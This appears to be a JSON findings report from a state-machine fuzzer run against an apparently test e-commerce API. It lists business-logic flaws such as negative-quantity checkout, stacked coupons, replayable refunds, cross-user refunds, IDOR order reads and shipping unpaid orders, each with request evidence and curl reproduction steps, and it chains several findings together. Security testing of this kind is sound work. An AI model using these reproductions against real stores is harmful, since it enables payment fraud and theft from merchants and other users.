@@ -1,0 +1,685 @@
+{
+  "tool": "statefuzz",
+  "version": "0.1.0",
+  "generated": "2026-11-07T07:20:55+0000",
+  "elapsed_s": 1.0,
+  "requests": 87,
+  "invariant_classes": [
+    "I1",
+    "I2",
+    "I3",
+    "I4",
+    "I5"
+  ],
+  "operators": [
+    "SKIP",
+    "REPLAY",
+    "REORDER",
+    "PARTIAL",
+    "NEGATIVE",
+    "CROSS-USER",
+    "INTERRUPT",
+    "IDEMPOTENCE"
+  ],
+  "findings": [
+    {
+      "id": "SF-NEG-QTY",
+      "title": "Negative-quantity checkout credits the attacker wallet",
+      "severity": "high",
+      "invariant": "I4",
+      "operators": [
+        "NEGATIVE"
+      ],
+      "endpoint": "POST /api/cart/items",
+      "preconditions": [
+        "any account"
+      ],
+      "grants": [
+        "credit self-balance without payment"
+      ],
+      "evidence": [
+        {
+          "method": "POST",
+          "path": "/api/cart/items",
+          "req_body": {
+            "sku": "SKU-CABLE",
+            "qty": -3
+          },
+          "status": 201,
+          "resp_body": {
+            "cart": {
+              "discount_pct": 0,
+              "items": {
+                "SKU-CABLE": -3
+              }
+            }
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/checkout/init",
+          "req_body": null,
+          "status": 201,
+          "resp_body": {
+            "order_id": "ORD-1d3388c7",
+            "status": "initiated",
+            "total_cents": -2700
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/checkout/confirm",
+          "req_body": {
+            "order_id": "ORD-1d3388c7"
+          },
+          "status": 200,
+          "resp_body": {
+            "charged_cents": -2700,
+            "order_id": "ORD-1d3388c7",
+            "status": "paid"
+          }
+        },
+        {
+          "wallet_before": 1000000,
+          "wallet_after": 1002700,
+          "order_total_cents": -2700,
+          "violation": {
+            "invariant": "I4",
+            "assertion": "order_total >= 0",
+            "observed": {
+              "order_total": -2700,
+              "wallet_delta": 2700
+            },
+            "detail": "checkout charged -2700 cents (negative) and wallet went UP by 2700"
+          }
+        }
+      ],
+      "reproduction": [
+        "curl -X POST $B/api/cart/items -d '{\"sku\":\"SKU-CABLE\",\"qty\":-3}'",
+        "curl -X POST $B/api/checkout/init",
+        "curl -X POST $B/api/checkout/confirm -d '{\"order_id\":...}'"
+      ],
+      "confidence": "high",
+      "status": "candidate",
+      "chain_ids": []
+    },
+    {
+      "id": "SF-STACK-DISC",
+      "title": "Coupon stacks without cap: discount exceeds subtotal",
+      "severity": "high",
+      "invariant": "I1",
+      "operators": [
+        "REPLAY"
+      ],
+      "endpoint": "POST /api/coupon/apply",
+      "preconditions": [
+        "any account"
+      ],
+      "grants": [
+        "drive order total to 0 or negative"
+      ],
+      "evidence": [
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 10
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 20
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 30
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 40
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 50
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 60
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 70
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 80
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 90
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 100
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 110
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/coupon/apply",
+          "req_body": {
+            "code": "WELCOME10"
+          },
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 120
+          }
+        },
+        {
+          "method": "GET",
+          "path": "/api/cart",
+          "req_body": null,
+          "status": 200,
+          "resp_body": {
+            "discount_pct": 120,
+            "items": {
+              "SKU-GPU": 1
+            },
+            "subtotal_cents": 129900,
+            "total_cents": -25980,
+            "user": "sf-stack"
+          }
+        },
+        {
+          "cart_after": {
+            "discount_pct": 120,
+            "items": {
+              "SKU-GPU": 1
+            },
+            "subtotal_cents": 129900,
+            "total_cents": -25980,
+            "user": "sf-stack"
+          },
+          "violation": {
+            "invariant": "I4",
+            "assertion": "discount_pct <= 100",
+            "observed": {
+              "discount_pct": 120,
+              "total_cents": -25980
+            },
+            "detail": "stacked discount 120% drives total to -25980"
+          }
+        }
+      ],
+      "reproduction": [
+        "for i in $(seq 12); do curl -X POST $B/api/coupon/apply -d '{\"code\":\"WELCOME10\"}'; done",
+        "curl $B/api/cart"
+      ],
+      "confidence": "high",
+      "status": "candidate",
+      "chain_ids": []
+    },
+    {
+      "id": "SF-CKOUT-REPLAY",
+      "title": "checkout/init is replayable: one cart snapshot yields duplicate orders",
+      "severity": "medium",
+      "invariant": "I2",
+      "operators": [
+        "REPLAY"
+      ],
+      "endpoint": "POST /api/checkout/init",
+      "preconditions": [
+        "any account",
+        "non-empty cart"
+      ],
+      "grants": [
+        "duplicate paid orders"
+      ],
+      "evidence": [
+        {
+          "method": "POST",
+          "path": "/api/checkout/init",
+          "req_body": null,
+          "status": 201,
+          "resp_body": {
+            "order_id": "ORD-f2c75dea",
+            "status": "initiated",
+            "total_cents": 1800
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/checkout/init",
+          "req_body": null,
+          "status": 201,
+          "resp_body": {
+            "order_id": "ORD-e77a0f94",
+            "status": "initiated",
+            "total_cents": 1800
+          }
+        },
+        {
+          "order_ids": [
+            "ORD-f2c75dea",
+            "ORD-e77a0f94"
+          ],
+          "violation": {
+            "invariant": "I2",
+            "assertion": "cart snapshot: 1 -> <=1 order",
+            "observed": {
+              "order_ids": [
+                "ORD-f2c75dea",
+                "ORD-e77a0f94"
+              ]
+            },
+            "detail": "checkout/init replayed from the same cart produced 2 orders with identical item sets"
+          }
+        }
+      ],
+      "reproduction": [
+        "curl -X POST $B/api/checkout/init   # twice, same cart"
+      ],
+      "confidence": "high",
+      "status": "candidate",
+      "chain_ids": []
+    },
+    {
+      "id": "SF-SHIP-UNPAID",
+      "title": "Order ships without payment (SKIP confirm)",
+      "severity": "high",
+      "invariant": "I2",
+      "operators": [
+        "SKIP"
+      ],
+      "endpoint": "POST /api/orders/{id}/ship",
+      "preconditions": [
+        "any account",
+        "order_id of any state"
+      ],
+      "grants": [
+        "fulfil without payment",
+        "seller loss"
+      ],
+      "evidence": [
+        {
+          "method": "POST",
+          "path": "/api/checkout/init",
+          "req_body": null,
+          "status": 201,
+          "resp_body": {
+            "order_id": "ORD-44e5af98",
+            "status": "initiated",
+            "total_cents": 129900
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/orders/ORD-44e5af98/ship",
+          "req_body": null,
+          "status": 200,
+          "resp_body": {
+            "order_id": "ORD-44e5af98",
+            "status": "shipped"
+          }
+        },
+        {
+          "order_id": "ORD-44e5af98",
+          "violation": {
+            "invariant": "I2",
+            "assertion": "action in delta(alpha(s))",
+            "observed": {
+              "from_state": "initiated",
+              "action": "ship",
+              "status": 200
+            },
+            "detail": "ship accepted from state 'initiated' (unmodeled)"
+          }
+        }
+      ],
+      "reproduction": [
+        "curl -X POST $B/api/checkout/init",
+        "curl -X POST $B/api/orders/<oid>/ship   # never confirmed"
+      ],
+      "confidence": "high",
+      "status": "candidate",
+      "chain_ids": [
+        "CH-SF-IDOR-ORDER-SF-SHIP-UNPAID",
+        "CH-SF-REFUND-CROSS-SF-SHIP-UNPAID"
+      ]
+    },
+    {
+      "id": "SF-IDOR-ORDER",
+      "title": "Any user can read any order (IDOR)",
+      "severity": "high",
+      "invariant": "I3",
+      "operators": [
+        "CROSS-USER"
+      ],
+      "endpoint": "GET /api/orders/{id}",
+      "preconditions": [
+        "any account",
+        "valid order_id"
+      ],
+      "grants": [
+        "read any order"
+      ],
+      "evidence": [
+        {
+          "method": "GET",
+          "path": "/api/orders/ORD-e16031f9",
+          "req_body": null,
+          "status": 200,
+          "resp_body": {
+            "id": "ORD-e16031f9",
+            "items": {
+              "SKU-GPU": 1
+            },
+            "owner": "sf-idor-own",
+            "status": "initiated",
+            "total_cents": 129900
+          }
+        },
+        {
+          "violation": {
+            "invariant": "I3",
+            "assertion": "caller == object.owner",
+            "observed": {
+              "caller": "sf-bob",
+              "owner": "sf-idor-own"
+            },
+            "detail": "sf-bob accessed order owned by sf-idor-own"
+          }
+        }
+      ],
+      "reproduction": [
+        "curl $B/api/orders/<victim-oid> -H 'Authorization: Bearer <bob-token>'"
+      ],
+      "confidence": "high",
+      "status": "candidate",
+      "chain_ids": [
+        "CH-SF-IDOR-ORDER-SF-SHIP-UNPAID",
+        "CH-SF-IDOR-ORDER-SF-REFUND-CROSS"
+      ]
+    },
+    {
+      "id": "SF-REFUND-CROSS",
+      "title": "Refund credits the CALLER, not the owner (cross-user withdrawal)",
+      "severity": "critical",
+      "invariant": "I3",
+      "operators": [
+        "CROSS-USER"
+      ],
+      "endpoint": "POST /api/orders/{id}/refund",
+      "preconditions": [
+        "any account",
+        "order_id of any paid order"
+      ],
+      "grants": [
+        "withdraw any user's order value to own wallet"
+      ],
+      "evidence": [
+        {
+          "method": "POST",
+          "path": "/api/orders/ORD-0d30270f/refund",
+          "req_body": null,
+          "status": 200,
+          "resp_body": {
+            "credited_cents": 129900,
+            "order_id": "ORD-0d30270f",
+            "status": "refunded"
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/orders/ORD-0d30270f/refund",
+          "req_body": null,
+          "status": 200,
+          "resp_body": {
+            "credited_cents": 129900,
+            "order_id": "ORD-0d30270f",
+            "status": "refunded"
+          }
+        },
+        {
+          "bob_wallet_before": 1000000,
+          "bob_wallet_after": 1259800,
+          "order_owner": "sf-alice",
+          "order_total": 129900
+        }
+      ],
+      "reproduction": [
+        "curl -X POST $B/api/orders/<victim-oid>/refund -H 'Authorization: Bearer <bob-token>'"
+      ],
+      "confidence": "high",
+      "status": "candidate",
+      "chain_ids": [
+        "CH-SF-REFUND-CROSS-SF-SHIP-UNPAID",
+        "CH-SF-IDOR-ORDER-SF-REFUND-CROSS"
+      ]
+    },
+    {
+      "id": "SF-REFUND-REPLAY",
+      "title": "Refund is replayable: double credit on one order",
+      "severity": "critical",
+      "invariant": "I1",
+      "operators": [
+        "REPLAY",
+        "IDEMPOTENCE"
+      ],
+      "endpoint": "POST /api/orders/{id}/refund",
+      "preconditions": [
+        "any account",
+        "own paid order"
+      ],
+      "grants": [
+        "multiply balance by refund count"
+      ],
+      "evidence": [
+        {
+          "method": "POST",
+          "path": "/api/orders/ORD-0d30270f/refund",
+          "req_body": null,
+          "status": 200,
+          "resp_body": {
+            "credited_cents": 129900,
+            "order_id": "ORD-0d30270f",
+            "status": "refunded"
+          }
+        },
+        {
+          "method": "POST",
+          "path": "/api/orders/ORD-0d30270f/refund",
+          "req_body": null,
+          "status": 200,
+          "resp_body": {
+            "credited_cents": 129900,
+            "order_id": "ORD-0d30270f",
+            "status": "refunded"
+          }
+        },
+        {
+          "credits": [
+            129900,
+            129900
+          ],
+          "violation": {
+            "invariant": "I1",
+            "assertion": "sum(credits) <= order_total",
+            "observed": {
+              "order_total": 129900,
+              "credits": [
+                129900,
+                129900
+              ],
+              "overcredit": 129900
+            },
+            "detail": "refunded sf-bob over price by 129900 cents"
+          },
+          "bob_wallet_delta": 259800
+        }
+      ],
+      "reproduction": [
+        "curl -X POST $B/api/orders/<oid>/refund  # repeat x2"
+      ],
+      "confidence": "high",
+      "status": "candidate",
+      "chain_ids": []
+    },
+    {
+      "id": "SF-ASYNC-DBL",
+      "title": "Async refund + sync refund double-credit inside the deferred window",
+      "severity": "critical",
+      "invariant": "I1",
+      "operators": [
+        "INTERRUPT",
+        "REPLAY"
+      ],
+      "endpoint": "POST /api/refunds/async",
+      "preconditions": [
+        "any account",
+        "own paid order"
+      ],
+      "grants": [
+        "2x credit per refund across async/sync seam"
+      ],
+      "evidence": [
+        {
+          "phase": "deferred",
+          "violation": {
+            "invariant": "I1",
+            "assertion": "wallet_delta == order_total",
+            "observed": {
+              "callback_refund_cents": 129900,
+              "order_total": 129900,
+              "wallet_delta": 259800
+            },
+            "detail": "deferred window credited 259800 cents total for a single 129900-cent refund (delta observed after callback resolution)"
+          },
+          "wallet_before": 870100,
+          "wallet_after": 1129900,
+          "callback": {
+            "marker": "7b65433c375d",
+            "refund_cents": 129900,
+            "status": "done"
+          },
+          "marker": "7b65433c375d"
+        }
+      ],
+      "reproduction": [
+        "curl -X POST $B/api/refunds/async -d '{\"order_id\":\"<oid>\"}'",
+        "curl -X POST $B/api/orders/<oid>/refund   # before callback settles"
+      ],
+      "confidence": "high",
+      "status": "candidate",
+      "chain_ids": []
+    }
+  ],
+  "chains": [
+    {
+      "chain_id": "CH-SF-IDOR-ORDER-SF-SHIP-UNPAID",
+      "members": [
+        "SF-IDOR-ORDER",
+        "SF-SHIP-UNPAID"
+      ],
+      "path": "SF-IDOR-ORDER --(supplies arbitrary order_id)--> SF-SHIP-UNPAID",
+      "severity": "high",
+      "impact": "Chaining SF-IDOR-ORDER (grants: read any order) with SF-SHIP-UNPAID yields an unauthenticated-to-financial-integrity path: fulfil without payment, seller loss."
+    },
+    {
+      "chain_id": "CH-SF-REFUND-CROSS-SF-SHIP-UNPAID",
+      "members": [
+        "SF-REFUND-CROSS",
+        "SF-SHIP-UNPAID"
+      ],
+      "path": "SF-REFUND-CROSS --(grants preconditions)--> SF-SHIP-UNPAID",
+      "severity": "critical",
+      "impact": "Chaining SF-REFUND-CROSS (grants: withdraw any user's order value to own wallet) with SF-SHIP-UNPAID yields an unauthenticated-to-financial-integrity path: fulfil without payment, seller loss."
+    },
+    {
+      "chain_id": "CH-SF-IDOR-ORDER-SF-REFUND-CROSS",
+      "members": [
+        "SF-IDOR-ORDER",
+        "SF-REFUND-CROSS"
+      ],
+      "path": "SF-IDOR-ORDER --(supplies arbitrary order_id)--> SF-REFUND-CROSS",
+      "severity": "critical",
+      "impact": "Chaining SF-IDOR-ORDER (grants: read any order) with SF-REFUND-CROSS yields an unauthenticated-to-financial-integrity path: withdraw any user's order value to own wallet."
+    }
+  ]
+}
